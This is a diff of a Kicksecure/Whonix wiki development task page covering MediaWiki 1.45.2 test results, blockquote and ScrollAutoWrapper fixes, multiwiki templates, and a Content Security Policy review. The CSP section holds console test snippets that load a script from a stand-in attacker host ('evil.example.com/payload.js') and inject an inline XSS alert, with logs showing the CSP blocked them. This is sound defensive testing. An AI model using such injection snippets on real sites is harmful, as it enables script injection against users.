@@ -450,127 +450,6 @@ Template:Stub
 </pre>
 
 = TODO DEV =
-== mediawiki update to 1.45.2 ==
-* done
-* pls check [[dev/wikitest]] - all good still?
-
-'''DEV'''
-* In progress
-* All tests were checked. Changes cannot be traced back exactly to the newest version
-* {{IconSet|true|As expected}} Anchor
-* {{IconSet|false|Problems}} Blockquote and quotation
-** Test 1.1: The lines don't work as expected. The first and the last line are separated which is new
-** Test 3: The multi line bullet point blockquote still doesn't work (Mediawiki bug, reported, see Test4.broken)
-** Test 4.2/.3/.4 don't work
-*** If it's "only" 2 lines then a line gap will be ignored for NAMED parameters
-*** This was tested with testTemplate where the Quotation templates was imitated (in minimal fashion). With an unnamed parameter it worked with "quote" as parameter it did not work
-*** Strangely if there's 3 lines or more it works again
-*** This seems to be a bug, probably in the new Parsoid parser
-** Test 4.broken: The broken test is still broken. The blockquote HTML inside ul > li is valid HTML, but the parser does not accept it
-* {{IconSet|true|As expected}} CodeSelect
-* {{IconSet|true|As expected}} Collapsible
-* {{IconSet|true|As expected}} Community Support
-* {{IconSet|true|As expected}} Extension CSS - '''But still needs the improvements to pass all tests'''
-* {{IconSet|true|As expected}} CustomRepo - Tests were improved (previously not very intuitive)
-
-== content improvements ==
-
-=== Whonix KVM wiki content improvement ===
-* https://www.whonix.org/wiki/KVM
-* similar to VirtualBox wiki page
-
-=== Whonix Windows Installer wiki content improvement ===
-* https://www.whonix.org/wiki/Windows_Quick_Start_Testers_Only_Version
-* similar to VirtualBox wiki page
-
-== consider multiwiki additions ==
-* [[Template:Footer]]
-* [[Template:Reflist]]
-* [[Template:Html_Donation_Panel_Crypto]]
-* [[Template:BootEntries]]
-* default: yes, make multi wiki if sensible even if not yet in use
-
-'''DEV'''
-# Footer is very similar. Tm is different. We would need a switch for that either in the template or in the widget
-#* {{IconSet|maybe|Question}} While researching this, I found that Widget:Footer has a wrong way of commenting out a block of code <code><nowiki><!-- --></nowiki></code> is not good for blocks in widgets, because the php smarty code is also wrapped in html comments in widgets.
-#** So if you wrap a block with php smarty code, then closing tag of the comment within might end the outer comment. The parser does it accidentally right, but it's formally wrong
-#** If have thought of the best solution in this context which I think is a wrapper like this, see Note 1 below
-#** I suggest one of 2 things (1) Create a new editor button (in the hidden advanced section), so editors can just select the block and click the button or (2) Document this somewhere in the documentation, so an editor can find it there -- I would prefer version 1, it's easily implemented
-# Reflist is basically the same. Can be easily changed to Multiwiki
-# Html_Donation_Panel_Crypto is already Multiwiki ready
-# BootEntries SEEMS Multiwiki ready, but Dev does not know if there's a difference for how it works on Kicksecure and Whonix
-# {{IconSet|maybe|Question}} I also noticed that the updating on Whonix does not automatically work from our script. Is Whonix wiki still supposed to be synchronized with Kicksecure wiki? - And is the mw-multi-wiki action still in use?
-
-Note 1 <pre>
-<!--{* This block below is deactivated if to /if *}-->
-<!--{if false}-->
-mycontent
-<!--{/if}-->
-</pre>
-
-'''DEV'''
-* Admin says multiwiki where possible
-
-= WAITING ON =
-
-= REVIEW PLEASE =
-
-== test cross site scripting and css is blocked by CSP ==
-* the CSP is supposed to block cross-site JS/CSS
-* should be blocked already by CSP: yes
-* cross site scripting should NOT work: expected blocked by CSP
-* cross site CSS should NOT work: expected blocked by CSP
-* please test:
-** can kicksecure.com use javascript hosted from whonix.org? expected: NO
-** can kicksecure.com use CSS hosted on whonix.org? expected: NO
-* failure case: if cross-site JS/CSS is possible, that would mean CSP is broken
-
-'''DEV'''
-* Done
-* This was tested by the test cases below
-* So the tests were "successful", but not of our own doing, but because of the browser fallback to default-src: self.
-* Here's maybe better suggestions with my own research and Ai support
-*# Default stays self, blob: also allowed (Javascript created blob loading)
-*# script-src only from self
-*# script-src-attr: none - means no inline Javascript. As we have now replaced "javascript:print()" - maybe there are no attribute-Javascripts left?
-*# style-src is for CSS files, style-src-attr ist for style="" which we regularely use and so cannot deactivate
-*# object-src none prevents Flash and Java on the page, so should be a no-brainer
-*# frame-ancestors 'self' secures against foreign frames or iframes embedding
-*# form-action - only using our own forms from our website, or paypal.com
-*# base-uri - we don't use base tags, but it's "free", so better be safe
-
-<pre>
-content-security-policy:
-    default-src 'self' data: blob:;
-    script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:;
-    script-src-attr 'none';
-    style-src 'self' 'unsafe-inline' blob:;
-    style-src-attr 'self' 'unsafe-inline';
-    object-src 'none';
-    frame-ancestors 'self';
-    form-action 'self' https://www.paypal.com;
-    base-uri 'self';
-</pre>
-
-'''Tests'''
-<pre>
-// Test case 1 : Add a script via console just for my browser session
-// Result : Loading the script 'https://evil.example.com/payload.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
-var evilScript = document.createElement('script');
-evilScript.src = 'https://evil.example.com/payload.js'; 
-document.body.appendChild(evilScript);
-
-// Test case 2 : Inject JS directly via console
-// Result : Not executed, also because of default-src: self
-document.body.innerHTML += '<script>alert("XSS by editor possible!")<\/script>';
-
-// Test case 3 : Use widget to load js and CSS
-// Results:
-// Loading the script 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.Understand this error
-// Loading the stylesheet 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.css' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'style-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
-</pre>
-
-
 == css extension fork tests ==
 * Write tests on wikitest page and check result with JS
 * test all cases, so a new version of CSS extension fork can just be implemented by admin and tests will show if it works
@@ -634,6 +513,206 @@ Patrick:
 * {{IconSet|maybe|Tendentially Approve}} The new solution is very restrictive. However, the 2 cases that this would really prevent might not be relevant for us and are not used currently.
 *# Unicode characters like äöü or other languages than english
 *# References with query parameters like <code><nowiki>{{#css:/load.php?module=ext.myCss}}</nowiki></code>
+
+Patrick:
+
+* both #4 and #5 had to be combined
+* latest: https://github.com/org-ai-assisted/mediawiki-extensions-CSS
+* diff: https://github.com/Kicksecure/mediawiki-extensions-CSS/compare/master...org-ai-assisted:mediawiki-extensions-CSS:master
+* please re-review if all good now
+
+== content improvements ==
+
+=== Whonix KVM wiki content improvement ===
+* https://www.whonix.org/wiki/KVM
+* similar to VirtualBox wiki page
+
+=== Whonix Windows Installer wiki content improvement ===
+* https://www.whonix.org/wiki/Windows_Quick_Start_Testers_Only_Version
+* similar to VirtualBox wiki page
+
+== consider multiwiki additions ==
+* [[Template:Footer]]
+* [[Template:Reflist]]
+* [[Template:Html_Donation_Panel_Crypto]]
+* [[Template:BootEntries]]
+* default: yes, make multi wiki if sensible even if not yet in use
+
+'''DEV'''
+# Footer is very similar. Tm is different. We would need a switch for that either in the template or in the widget
+#* {{IconSet|maybe|Question}} While researching this, I found that Widget:Footer has a wrong way of commenting out a block of code <code><nowiki><!-- --></nowiki></code> is not good for blocks in widgets, because the php smarty code is also wrapped in html comments in widgets.
+#** So if you wrap a block with php smarty code, then closing tag of the comment within might end the outer comment. The parser does it accidentally right, but it's formally wrong
+#** If have thought of the best solution in this context which I think is a wrapper like this, see Note 1 below
+#** I suggest one of 2 things (1) Create a new editor button (in the hidden advanced section), so editors can just select the block and click the button or (2) Document this somewhere in the documentation, so an editor can find it there -- I would prefer version 1, it's easily implemented
+# Reflist is basically the same. Can be easily changed to Multiwiki
+# Html_Donation_Panel_Crypto is already Multiwiki ready
+# BootEntries SEEMS Multiwiki ready, but Dev does not know if there's a difference for how it works on Kicksecure and Whonix
+# {{IconSet|maybe|Question}} I also noticed that the updating on Whonix does not automatically work from our script. Is Whonix wiki still supposed to be synchronized with Kicksecure wiki? - And is the mw-multi-wiki action still in use?
+
+Note 1 <pre>
+<!--{* This block below is deactivated if to /if *}-->
+<!--{if false}-->
+mycontent
+<!--{/if}-->
+</pre>
+
+'''DEV'''
+* Admin says multiwiki where possible
+
+= WAITING ON =
+
+= REVIEW PLEASE =
+
+== Scrollautowrapper failed mw-collapsible test ==
+
+* Original problem: ScrollAutoWrapper : Test 2 on wikitests fails now. It's unclear what the problem is. The div scroll wrapper renders too early which leads to false sizes, which was not the case before. Further investigation necessary.
+
+'''DEV'''
+* Done
+* Bug was fixed
+* This bug was indeed caused by the new Mediawiki version. It newly uses the "hidden"-attribute and does not hide the element truly, but wants to be screenreader friendly and hides the element "without really hiding it" (positioning, width, height etc). Because of this the hidden elements were falsy identified as visible and directly (and wrongly) rendered
+* Now we also check if a parent / ancestor has the "hidden" attribut and if so consider the element as hidden
+
+== Blockquote mediawiki problems ==
+
+* Blockquote and therefore quotation template break when the first and last line are directly in contact with the tag without newline
+* Write one or two bugreports for both found strange behaviors
+
+'''DEV'''
+* Done
+* This bugreport was found https://phabricator.wikimedia.org/T309778 in this documentation 
+* In the doc is states (with link to the bug) <blockquote>If the quote contains multiple paragraphs the tags need to be on separate lines to display properly, i.e.: </blockquote>
+* Therefore I changed the quotation template to a more robust version (the one recommended bugproof version in the doc). Now the tests work
+* Tests on wikitest in Quotation and Blockquote were changed to reflect this
+* Dev recommends not writing a bug report because it seems this will never be fixed in fear of breaking backwards compatibility and because the other bug reports about it are still open
+* Documentation was updated: [[Dev/mediawiki#Quotation_(Template)|Quotation (Template)]]
+
+== mediawiki update to 1.45.2 ==
+* done
+* pls check [[dev/wikitest]] - all good still?
+
+'''DEV'''
+* Done
+* All tests were checked. Changes cannot be traced back exactly to the newest version
+* {{IconSet|true|As expected}} Anchor
+* {{IconSet|false|Problems}} Blockquote and quotation
+** Test 1.1: The lines don't work as expected. The first and the last line are separated which is new
+** Test 3: The multi line bullet point blockquote still doesn't work (Mediawiki bug, reported, see Test4.broken)
+** Test 4.2/.3/.4 don't work
+*** If it's "only" 2 lines then a line gap will be ignored for NAMED parameters
+*** This was tested with testTemplate where the Quotation templates was imitated (in minimal fashion). With an unnamed parameter it worked with "quote" as parameter it did not work
+*** Strangely if there's 3 lines or more it works again
+*** This seems to be a bug, probably in the new Parsoid parser
+** Test 4.broken: The broken test is still broken. The blockquote HTML inside ul > li is valid HTML, but the parser does not accept it
+* {{IconSet|true|As expected}} CodeSelect
+* {{IconSet|true|As expected}} Collapsible
+* {{IconSet|true|As expected}} Community Support
+* {{IconSet|true|As expected}} Extension CSS - '''But still needs the improvements to pass all tests'''
+* {{IconSet|true|As expected}} CustomRepo + Tests were improved (previously not very intuitive)
+* {{IconSet|true|As expected}} Discover hidden elemens
+* {{IconSet|true|As expected}} DonorCard (incl. Testpage Donors)
+* {{IconSet|true|As expected}} DownloadButton Widget
+* {{IconSet|true|As expected}} Expand button + Tests were improved
+* {{IconSet|true|As expected}} Expand Collapse All
+* {{IconSet|true|As expected}} ExtLink
+* {{IconSet|true|As expected}} Gallery + Tests were improved
+* {{IconSet|true|As expected}} Github_link + Tests were improved
+* {{IconSet|true|As expected}} GoogleOff + Tests were improved
+* {{IconSet|true|As expected}} Headline + Tests strongly improved
+* {{IconSet|true|As expected}} HtmlComment + Tests improved
+* {{IconSet|true|As expected}} Icon
+* {{IconSet|true|As expected}} Icon Bullet List
+* {{IconSet|true|As expected}} IconSet
+* {{IconSet|true|As expected}} Info Tooltip
+* {{IconSet|true|As expected}} Intro and IntroLike
+* {{IconSet|true|As expected}} Keypress + Tests improved
+* {{IconSet|true|As expected}} LeftRightImage
+* {{IconSet|true|As expected}} mbox
+* {{IconSet|true|As expected}} MiniMoal + Tests strongly improved
+* {{IconSet|true|As expected}} Mininav + Tests improved
+* {{IconSet|true|As expected}} PayViaPaypal
+* {{IconSet|false|Problems}} ScrollAutoWrapper : Test 2 fails now. It's unclear what the problem is. The div scroll wrapper renders too early which leads to false sizes, which was not the case before. Further investigation necessary.
+* {{IconSet|true|As expected}} ShareTooltip
+* {{IconSet|true|As expected}} SitenoticeBanner
+* {{IconSet|true|As expected}} StyledText
+* {{IconSet|true|As expected}} Subdomain_link
+* {{IconSet|true|As expected}} SVG
+* {{IconSet|maybe|Question}} TabContentController : Works. But test "Tab Controller : Linked Controller with nested Controller" does not seem to come from Dev. And what is tested there is not obvious
+* {{IconSet|true|As expected}} TableExpandModal
+* {{IconSet|true|As expected}} ThumbGallery
+* {{IconSet|false|Problems}} Thumbnails : Behavior has changed. Reason unclear. Needs further investigation.
+* {{IconSet|true|As expected}} vspacer template
+* {{IconSet|true|As expected}} CSS col-container
+* {{IconSet|true|As expected}} CSS color schemes
+* {{IconSet|true|As expected}} CSS columns
+* {{IconSet|false|Problems}} CSS hide-enlarge : Behavior has changed. Reason unclear. Needs further investigation.
+* {{IconSet|true|As expected}} CSS no js classes + Tests strongly improved
+* {{IconSet|maybe|As expected}} Mixed : Tests as expected. But this section is a bit unordered and was not done by Dev. Could be improved if important
+
+'''DEV'''
+* Done
+* Admin decided on what to do with these results. New tasks are added for this
+** Blockquote → solve + bugreport
+** ScrollAutoWrapper → solve
+** TabContentController → remove undocumented tests if there's nothing new tested there
+** thumbnail-behavior and css hide-enlarge → ignore
+* So this task can be closed
+
+== test cross site scripting and css is blocked by CSP ==
+* the CSP is supposed to block cross-site JS/CSS
+* should be blocked already by CSP: yes
+* cross site scripting should NOT work: expected blocked by CSP
+* cross site CSS should NOT work: expected blocked by CSP
+* please test:
+** can kicksecure.com use javascript hosted from whonix.org? expected: NO
+** can kicksecure.com use CSS hosted on whonix.org? expected: NO
+* failure case: if cross-site JS/CSS is possible, that would mean CSP is broken
+
+'''DEV'''
+* Done
+* This was tested by the test cases below
+* So the tests were "successful", but not of our own doing, but because of the browser fallback to default-src: self.
+* Here's maybe better suggestions with my own research and Ai support
+*# Default stays self, blob: also allowed (Javascript created blob loading)
+*# script-src only from self
+*# script-src-attr: none - means no inline Javascript. As we have now replaced "javascript:print()" - maybe there are no attribute-Javascripts left?
+*# style-src is for CSS files, style-src-attr ist for style="" which we regularely use and so cannot deactivate
+*# object-src none prevents Flash and Java on the page, so should be a no-brainer
+*# frame-ancestors 'self' secures against foreign frames or iframes embedding
+*# form-action - only using our own forms from our website, or paypal.com
+*# base-uri - we don't use base tags, but it's "free", so better be safe
+
+<pre>
+content-security-policy:
+    default-src 'self' data: blob:;
+    script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:;
+    script-src-attr 'none';
+    style-src 'self' 'unsafe-inline' blob:;
+    style-src-attr 'self' 'unsafe-inline';
+    object-src 'none';
+    frame-ancestors 'self';
+    form-action 'self' https://www.paypal.com;
+    base-uri 'self';
+</pre>
+
+'''Tests'''
+<pre>
+// Test case 1 : Add a script via console just for my browser session
+// Result : Loading the script 'https://evil.example.com/payload.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
+var evilScript = document.createElement('script');
+evilScript.src = 'https://evil.example.com/payload.js'; 
+document.body.appendChild(evilScript);
+
+// Test case 2 : Inject JS directly via console
+// Result : Not executed, also because of default-src: self
+document.body.innerHTML += '<script>alert("XSS by editor possible!")<\/script>';
+
+// Test case 3 : Use widget to load js and CSS
+// Results:
+// Loading the script 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.Understand this error
+// Loading the stylesheet 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.css' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'style-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
+</pre>
+
 
 == next ai review ==
 * https://github.com/org-ai-assisted/kicksecure-wiki-backup/pull/2
